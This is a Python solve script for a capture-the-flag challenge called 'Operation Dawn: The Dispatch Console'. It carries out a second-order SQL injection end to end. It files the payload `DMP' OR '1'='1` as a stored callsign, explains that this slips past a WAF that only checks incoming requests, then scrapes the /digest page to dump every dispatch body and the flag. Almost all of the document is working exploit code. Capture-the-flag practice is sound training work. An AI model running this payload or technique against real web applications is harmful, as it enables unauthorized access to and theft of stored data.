#!/usr/bin/env python3
"""Operation Dawn: The Dispatch Console — second-order SQL injection.
/post stores the callsign with a bound parameter (safe), but /digest later re-reads each
stored callsign into a concatenated query  ...WHERE callsign='<stored callsign>'.
The global WAF (blocks union/select/-- on the *incoming* request) never sees the digest's
internal query, so a stored callsign  X' OR '1'='1  turns that per-callsign lookup into
WHERE callsign='X' OR '1'='1'  and the digest group dumps every dispatch body, including
the locked command-net standing order.
usage: python3 solve.py http://HOST:PORT     (stdlib only)"""
import sys, re, urllib.parse, urllib.request

def post(base, callsign, body):
    data = urllib.parse.urlencode({"callsign": callsign, "body": body}).encode()
    urllib.request.urlopen(base + "/post", data, timeout=15).read()

def get(base, path):
    return urllib.request.urlopen(base + path, timeout=15).read().decode("utf-8", "replace")

def solve(base):
    base = base.rstrip("/")
    marker = "DMP"
    payload = marker + "' OR '1'='1"          # no union/select/-- -> passes the WAF
    print(f"[*] filing second-order payload callsign: {payload!r}")
    post(base, payload, "x")

    print("[*] reading /digest (its per-callsign query now matches every row)")
    html = get(base, "/digest")
    text = re.sub(r"<[^>]+>", " ", html)
    text = re.sub(r"&#x27;|&#39;", "'", text)

    flag = re.search(r"CSCTF\{[^}]*\}", text)
    # show the dumped group bodies for context
    bodies = re.findall(r"-\s*([^-\n]{3,120})", text.split("digest", 1)[-1])
    for b in bodies[:12]:
        b = b.strip()
        if b and "console" not in b.lower():
            print("    body:", b)
    print("FLAG:", flag.group(0) if flag else "not found (digest may need a boolean-blind pivot)")
    return flag.group(0) if flag else None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit("usage: python3 solve.py http://HOST:PORT")
    solve(sys.argv[1])
